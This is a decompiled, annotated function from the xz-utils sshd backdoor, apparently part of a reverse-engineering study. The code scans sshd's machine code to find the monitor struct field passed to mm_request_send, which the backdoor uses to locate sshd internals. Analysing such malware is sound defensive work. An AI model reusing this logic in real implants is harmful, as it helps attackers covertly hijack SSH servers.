// /home/kali/xzre-ghidra/xzregh/102FF0_sshd_find_monitor_field_slot_via_mm_request_send.c
// Function: sshd_find_monitor_field_slot_via_mm_request_send @ 0x102FF0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_monitor_field_slot_via_mm_request_send(u8 * code_start, u8 * code_end, u8 * data_start, u8 * data_end, void * * monitor_field_ptr_out, global_context_t * ctx)


/*
 * AutoDoc: Disassembles a monitor helper, finds a MOV/LEA that pulls from sshd's `.data/.bss`, and then spends the next ~0x40 bytes tracking that register through copies until it lands in RDI and flows into `mm_request_send`. When every predicate fires the referenced `.bss` address is returned as the monitor struct field (sendfd/recvfd/sshbuf pointer, etc.).
 */

#include "xzre_types.h"

BOOL sshd_find_monitor_field_slot_via_mm_request_send
               (u8 *code_start,u8 *code_end,u8 *data_start,u8 *data_end,void **monitor_field_ptr_out
               ,global_context_t *ctx)

{
  u8 rex_extension;
  BOOL decode_ok;
  u8 *monitor_field_addr;
  u8 tracked_reg;
  u8 candidate_reg;
  long clear_idx;
  u8 mirrored_reg;
  u8 *mov_search_cursor;
  dasm_ctx_t *zero_ctx_cursor;
  u8 *call_window_end;
  dasm_ctx_t insn_ctx;
  
  *monitor_field_ptr_out = (void *)0x0;
  monitor_field_addr = (u8 *)0x0;
  if (code_start < code_end) {
    zero_ctx_cursor = &insn_ctx;
    // AutoDoc: Reset the MOV/LEA decoder state ahead of each hunt so stale prefixes never taint the tracked register.
    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
      *(u32 *)&zero_ctx_cursor->instruction = 0;
      zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
    }
    while( TRUE ) {
      // AutoDoc: Seed the analysis by re-running the MOV/LEA scanner until a writable sshd address is loaded into a register.
      decode_ok = find_riprel_mov_or_lea(code_start,code_end,TRUE,TRUE,&insn_ctx);
      monitor_field_addr = (u8 *)(ulong)decode_ok;
      if (decode_ok == FALSE) break;
      monitor_field_addr = (u8 *)0x0;
      if (((insn_ctx.prefix.flags_u32 & 0x100) != 0) &&
         (monitor_field_addr = (u8 *)insn_ctx.mem_disp,
         ((uint)insn_ctx.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
        monitor_field_addr = insn_ctx.instruction + insn_ctx.mem_disp + insn_ctx.instruction_size;
      }
      tracked_reg = 0;
      if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
        if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
          tracked_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
          if (((insn_ctx.prefix.flags_u32 & 0x1000) != 0) &&
             (tracked_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
            rex_extension = insn_ctx.prefix.modrm_bytes.rex_byte << 3;
            goto LAB_001030d4;
          }
        }
        else {
          tracked_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
          if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
            rex_extension = insn_ctx.prefix.modrm_bytes.rex_byte * '\x02';
LAB_001030d4:
            tracked_reg = tracked_reg | rex_extension & 8;
          }
        }
      }
      code_start = insn_ctx.instruction + insn_ctx.instruction_size;
      // AutoDoc: Only consider MOV/LEA hits that touch sshd's `.data/.bss` window—the monitor struct lives there.
      if ((data_start <= monitor_field_addr) && (monitor_field_addr < data_end)) {
        // AutoDoc: Clamp the search window to roughly 0x40 bytes so only the prologue-sized snippet is analysed.
        call_window_end = code_start + 0x40;
        if (ctx->sshd_text_end < code_start + 0x40) {
          call_window_end = (u8 *)ctx->sshd_text_end;
        }
        mirrored_reg = 0;
        candidate_reg = 0;
        mov_search_cursor = code_start;
LAB_00103110:
        do {
          decode_ok = x86_decode_instruction(&insn_ctx,mov_search_cursor,call_window_end);
          if (decode_ok == FALSE) {
            mov_search_cursor = mov_search_cursor + 1;
          }
          else {
            mov_search_cursor = insn_ctx.instruction + insn_ctx.instruction_size;
            if (insn_ctx.opcode_window_dword == 0x109) {
              rex_extension = insn_ctx.prefix.modrm_bytes.modrm_rm;
              if ((insn_ctx.prefix.flags_u32 & 0x1040) == 0) {
                if ((insn_ctx.prefix.flags_u32 & 0x40) != 0) goto LAB_00103237;
              }
              else if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
                candidate_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
                if (((insn_ctx.prefix.flags_u32 & 0x1000) != 0) &&
                   (candidate_reg = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
                  candidate_reg = insn_ctx.mov_imm_reg_index |
                          (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
                }
              }
              else {
                candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
                if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
                  candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_reg |
                          insn_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8;
                }
LAB_00103237:
                mirrored_reg = rex_extension;
                if ((insn_ctx.prefix.flags_u32 & 0x20) != 0) {
                  mirrored_reg = rex_extension | (insn_ctx.prefix.modrm_bytes.rex_byte & 1) << 3;
                }
              }
            }
            else if (insn_ctx.opcode_window_dword == 0x10b) {
              if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
                if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
                  rex_extension = insn_ctx.mov_imm_reg_index;
                  if ((insn_ctx.prefix.flags_u32 & 0x1000) != 0) goto LAB_00103237;
                  mirrored_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
                  if (tracked_reg != candidate_reg) goto LAB_0010325f;
                  mirrored_reg = 0;
                  tracked_reg = insn_ctx.prefix.decoded.flags2 & 0x10;
                  goto LAB_00103110;
                }
              }
              else if ((insn_ctx.prefix.flags_u32 & 0x20) == 0) {
                candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_rm;
                if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
                  mirrored_reg = insn_ctx.prefix.modrm_bytes.modrm_reg;
                }
              }
              else {
                candidate_reg = insn_ctx.prefix.modrm_bytes.modrm_rm |
                        insn_ctx.prefix.modrm_bytes.rex_byte * '\b' & 8;
                if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
                  mirrored_reg = insn_ctx.prefix.modrm_bytes.rex_byte * '\x02' & 8 |
                          insn_ctx.prefix.modrm_bytes.modrm_reg;
                }
              }
            }
            if (tracked_reg == candidate_reg) {
              tracked_reg = mirrored_reg;
              // AutoDoc: Once the tracked pointer flows into RDI (argument register 7) the helper expects a nearby `mm_request_send` call.
              if (mirrored_reg == 7) {
                // AutoDoc: Verify that the mm_request_send call immediately follows; if it does, the captured address becomes the monitor slot.
                decode_ok = find_rel32_call_instruction
                                  (insn_ctx.instruction + insn_ctx.instruction_size,call_window_end,
                                   (u8 *)ctx->sshd_ctx->mm_request_send_start,&insn_ctx);
                if (decode_ok != FALSE) {
                  *monitor_field_ptr_out = monitor_field_addr;
                  monitor_field_addr = (u8 *)(ulong)decode_ok;
                  goto LAB_001032a5;
                }
                break;
              }
              goto LAB_00103110;
            }
          }
LAB_0010325f:
        } while (mov_search_cursor < call_window_end);
      }
      monitor_field_addr = code_end;
      if (code_end <= code_start) break;
    }
  }
LAB_001032a5:
  return (BOOL)monitor_field_addr;
}

